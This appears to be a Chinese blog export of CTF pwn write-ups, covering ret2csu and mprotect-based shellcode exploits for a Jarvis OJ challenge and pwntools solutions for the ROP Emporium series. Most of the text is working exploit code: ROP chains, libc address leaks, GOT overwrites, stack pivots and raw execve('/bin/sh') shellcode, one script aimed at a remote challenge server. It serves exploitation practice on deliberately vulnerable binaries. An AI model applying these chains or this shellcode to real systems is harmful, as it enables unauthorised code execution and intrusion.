发现这个程序调用了write和read两个函数。没有system没有“/bin/sh”看到了熟悉的gadget 再看看在write和read里面，参数分别是存入哪些寄存器 Write Read 易知第三个参数存入edx（rdx），第二个是esi（rsi），第三个是edi（rdi）在上面的万用gadget里我们知道rdx的值来自于r13，rsi来自于r14，edi来自于r15d 我们要做的是（1）、先调用write函数把read/write函数的真实地址泄露出来（运行程序的时候这两个函数被调用了）找到system或者execve的真实地址（2）、用read函数，把system（“/bin/sh”）写进bss段里(system在bss里，即bss_addr，”/bin/sh”在bss的下一个地址,即bss_addr+8（3）、调用system函数达成getshell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *from LibcSearcher import *p = process("./level5")elf = ELF('./level5')write_got = elf.got['write']read_got = elf.got['read']#bss_base = elf.bss()bss_addr = 0x0601040start_addr = 0x0400600 #add rsp, 8 pop rbx,rbp,r12,r13,r14,r15end_addr = 0x040061A #mov rdx,13 rsi,r14 eid,r15 call_start = elf.symbols['_start']def csu(rbx,rbp,r12,r13,r14,r15,_start): payload = "a"*0x80 +p64(0) payload += p64(end_addr)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(start_addr)+"a"*0x38 payload += p64(_start) p.send(payload) sleep(1)p.recvuntil('Hello, World\n')csu(0,1,write_got,8,write_got,1,_start)write_addr = u64(p.recv(8))libc = LibcSearcher('write',write_addr)offest = write_addr-libc.dump('write')system_addr = libc.dump('system')+offestp.recvuntil("Hello, World\n")csu(0,1,read_got,16,bss_addr,0,_start)p.send(p64(system_addr)+"/bin/sh\x00")p.recvuntil("Hello, World\n")csu(0,1,bss_addr,0,0,bss_addr+8,_start)p.interactive() 运行结果 OJ level5题目说假设system和execve被禁用，用mmap和mprotect实现getshell。所以我们需要自己将shellcode写进bss段里。 科普一下mmap和mprotect 我们通过函数mmap来告诉操作系统把哪个文件映射哪块内存去，并且设置我们可能对这块内存的不能操作，就是对文件一样。 1234#include&lt;sys/mman.h&gt;void* mmap(void* addr, size_t len, int port, int flag, int filedes, off_t off)返回值：成功返回被映射的内存地址，失败返回MAP_FIALED 参数 addr这个只有在极少数情况下才不为0，这个参数告诉内核使用addr指定的值来映射指定文件。当指定为0的时候，告诉内核返回什么地址内其自身决定。除非非常了解系统进程模式，或者对当前环境非常了解，否则的话手工指定这个值总是不可取。参数 len指定被映射的内存区域的长度。参数 port这个参数对应open函数的权限位，我们可以指定为：PROT_READ，映射区可读；PROT_WRITE，映射区可写；PROT_EXEC，映射区可执行；PROT_NONE，映射区不可访问。由于只能映射已经打开的文件，所以这个权限位不能超出open函数指定的权限，比如说在open的时候指定为只读，那就不能在此时指定PORT_WRITE。参数 flag这个参数指定了映射区的其它一些属性，权限的属性已经在port中指定。这里可能存在的典型值有：MAP_FIXED，针对addr属性，如果指定这个位，那么要求系统必需在指定的地址映射，这往往是不可取的；MAP_SHARED，此标志说明指定映射区是共享的，意思就是说对内存的操作与对文件的操作是相对应的，它不能与MAP_PRIVATE标志一直使用，因为它们表达的意图是相反的；MAP_PRIVATE，该标志说明映射区是私用的，此时被映射的内存只能被当前里程使用，当进程操作的内存将会产生原文件的一个副本。 mprotect 函数可以更改一个已经存在的映射区的访问权限。 1234#include&lt;sys/mman.h&gt;int mprotect(void* addr, size_t len, int port)返回值：成功返回0，失败返回-1 参数 addr这个参数是mmap返回的数值，此时它就是mprotect作用的范围。参数 len指定映射区的长度，它需要与mmap中指定相同。参数 port在上面我们已经介绍了port的可能取值，mprotect功能就是把这个port指定的属性施加于相应的映射区上。 好，我们来看题 开了NX既然题目有提示一个更改权限的函数，那我们就去看一下bss段的权限，应该是禁止执行了的 readelf -S先找到bss的地址 vmmap查看权限，bss段的地址为0x600a88 ，在0x600000-0x601000之间，不可执行 思路：（1）先通过write函数leak出write（也可以是其他）的真实地址（2）找到mprotect的真实地址（3）将shellcode写入bss段（4）调用mprotect将bss段权限更改（5）调用bss，getshell 第一段的代码：（leak write_addr，found mprotect_addr） 第二段（shellcode写入bss） 第三段（找两个空的got地址，将mprotect和bss写入方便调用） 最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以） 两种方法的exp第一种（写个函数，直接调用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = "debug"sh=remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf =ELF('./level3_x64')libc = ELF('./libc-2.19.so')vul = elf.symbols['vulnerable_function']#read_plt = elf.symbols['read']read_got = elf.got['read']read_libc = libc.symbols['read']mprotect_libc = libc.symbols['mprotect']write_libc = libc.symbols["write"]write_got = elf.got['write']#write_plt = elf.plt['write']#bss = 0x0600A88bss = elf.bss()#gadgetpop5_addr = 0x04006A6mov_call = 0x0400690 bss_got = 0x0600A48mprotect_got = 0x0600A50def csu(r12,r13,r14,r15,data=False): data_num='' payload = "a"*0x88 payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(mov_call)+"a"*0x38 payload += p64(vul) sh.recvuntil("Input:\n") sh.send(payload) if data==True: data_num = u64(sh.recv(8)) return data_numread_addr = csu(write_got,8,read_got,1,True)mprotect_addr = read_addr - read_libc + mprotect_libcprint "mprotect_addr:" + hex(mprotect_addr)read_got = elf.got['read']bss = elf.bss()shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'csu(read_got,len(shellcode),bss,0)sh.send(shellcode)mprotect_got = 0x0600A50csu(read_got,8,mprotect_got,0)sh.send(p64(mprotect_addr))csu(mprotect_got,7,0x1000,0x600000)bss_got = 0x0600A48csu(read_got,8,bss_got,0)sh.send(p64(bss))csu(bss_got,0,0,0)sh.interactive() 第二种（用pop rdi，rsi，rdx来存参） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh =remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")#write_plt = 0x04004B0write_plt = elf.plt["write"]write_got = elf.got["write"]vul = elf.symbols["vulnerable_function"]#bss = 0x0600A88bss_base = elf.bss()read_plt = elf.symbols["read"]read_got = elf.got["read"]write_libc = libc.symbols["write"]mprotect_libc = libc.symbols["mprotect"]#gadgetpop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third pop5_addr = 0x00000000004006A6mov_call = 0x0000000000400690 #distence 0x1apayload1 = "a"*0x80 + p64(0)payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)sh.recv()sleep(0.2)sh.send(payload1)data = sh.recv(8)write_addr = u64(data)libc_dis = write_addr - libc.symbols["write"]mprotect_addr = libc_dis + libc.symbols["mprotect"]read_plt = elf.symbols["read"]bss_base = elf.bss()pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third #shellcode = asm(shellcraft.sh())shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'payload2 = "a"*0x80 + p64(0)payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload2)sleep(0.2)sh.send(shellcode)bss_got = 0x0000000000600A48payload4 = "a"*0x80 + p64(0)payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload4)sleep(0.2)sh.send(p64(bss_base)) mprotect_got = 0x0000000000600A50payload3 = "a"*0x80 +p64(0)payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload3)sleep(0.2)sh.send(p64(mprotect_addr))pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third payload5 = 'a'*0x80+p64(0)payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)payload5 +=p64(mov_call) payload5 += 'a'*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)payload5 += p64(mov_call)sleep(0.2)sh.send(payload5)sh.interactive()` 权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROP Emporium]]></title>
    <url>%2F2019%2F07%2F08%2FROP%20Emporium%2F</url>
    <content type="text"><![CDATA[这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。 1-ret2win12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./ret2win')shell=0x0400824bss = 0x0601060payload = 0x20*"a" + p64(0) + p64(shell)sh.sendline(payload)sh.interactive() 2-split12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./split')system = 0x04005E0cat_flag = 0x0601060bss = 0x0601080pop_rdi = 0x0400883payload = "a"*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() 3-callme题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写） so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数 然后找到rdi rsi rdx三个可以用的接下来上脚本 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./callme')callme_one = 0x0401850callme_two = 0x0401870callme_three = 0x0401810pop_rdi_rsi_rdx = 0x0401ab0 #wirte 1/2/3 in callmepayload = "a"*0x20 + p64(0)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)sh.sendline(payload)sh.interactive() 32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。 4-write4首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。借助pop 然后我们选那个r14、r15的地址然后还要去找mov的地址来给寄存器赋值的 然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./write4')system = 0x04005E0pop_rdi = 0x0400893 bss = 0x0601060pop_r14_r15 = 0x0400890 mov_r14_r15 = 0x0400820 payload = "a"*0x20+p64(0)payload += p64(pop_r14_r15) + p64(bss) + "/bin/sh\x00" + p64(mov_r14_r15) #save the /bin/sh into bsspayload += p64(pop_rdi) + p64(bss) + p64(system) #rdi-&gt;system bss is the x in systemsh.sendline(payload)sh.interactive() 5-badchars通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它 最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下 123456789101112131415161718# -*- coding: utf-8 -*-from pwn import *chars = [98,105,99,47,32,102,110,115]num = 1binsh = "/bin/sh\x00"while 1: for i in binsh: x = ord(i) ^ num if x in chars: num += 1 break if i == "\x00": print num num += 1 if num == 10: break 我们选用2然后我们就可以写exp了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"num = ""for x in binsh: num += chr(ord(x)^2)system = 0x04006F0 bss = 0x0601080 pop_rdi = 0x0400b39 mov_r12_r13 = 0x0400b34 pop_r12_r13 = 0x0400b3b #write num in bsspop_r14_r15 = 0x0400b40xor_r15_r14 = 0x0400b30 #back to binshpayload = "a" * 0x20 + p64(0)payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)#back to binshfor i in range(0,len(num)): payload += p64(pop_r14_r15) + p64(2) + p64(bss+i) payload += p64(xor_r15_r14)payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 6-fluff这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值） 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *sh = process('./fluff')system = 0x04005E0bss = 0x0601060pop_rdi = 0x04008c3 pop_r12 = 0x04008bc#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retxor_r11_r11 = 0x0400822# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retxor_r11_r12 = 0x040082f# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retxchg_r11_r10 = 0x0400840# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retmov_r10_r11 = 0x040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retpayload = "a"*0x20 + p64(0)payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0) payload += p64(xor_r11_r12) + p64(0)payload += p64(xchg_r11_r10) + p64(0) payload += p64(pop_r12) + "/bin/sh\x00"+ p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0)payload += p64(xor_r11_r12) + p64(0) payload += p64(mov_r10_r11) + p64(0) + p64(0) payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 7-pivot这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。 .so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./pivot')libc = ELF('./libpivot.so')foothold_function_so = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']foothold_function_plt = 0x0400850foothold_function_got = 0x0602048offest = ret2win - foothold_function_so#gadgetpop_rax = 0x0400b00mov_rax_addr = 0x0400b05pop_rbp = 0x0400900pop_rdi = 0x0400b73call_rax = 0x040098eadd_rax_rbp = 0x0400b09xchg_rax_rsp = 0x0400b02sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")heap_addr = int(sh.recv(14),16)payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)payload2 = "a"*0x20 + p64(0)payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)sh.recvuntil("&gt; ")sh.sendline(payload1)sh.recvuntil("&gt; ")sh.sendline(payload2)sh.recvuntil("into libpivot.so") #foothold_function() in libpivot.so print this sentencesh.interactive() 8-ret2csu1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./ret2csu')gdb.attach(sh)system = 0x04005A0ret2win = 0x04007B1init = 0x0600E18 #self init/fini#gadget pop5_addr = 0x040089A #pop_rbx_rbp_r12_r13_r14_r15mov_call = 0x0400880 #mov rdx_r15 rsi_r14 edi_r13d call r12+rbp*8payload = "a"*0x20 + p64(0)payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)payload += p64(mov_call) + "a"*56 + p64(ret2win)gdb.attach(sh,'b setvbuf')sh.sendline(payload)sh.interactive()]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
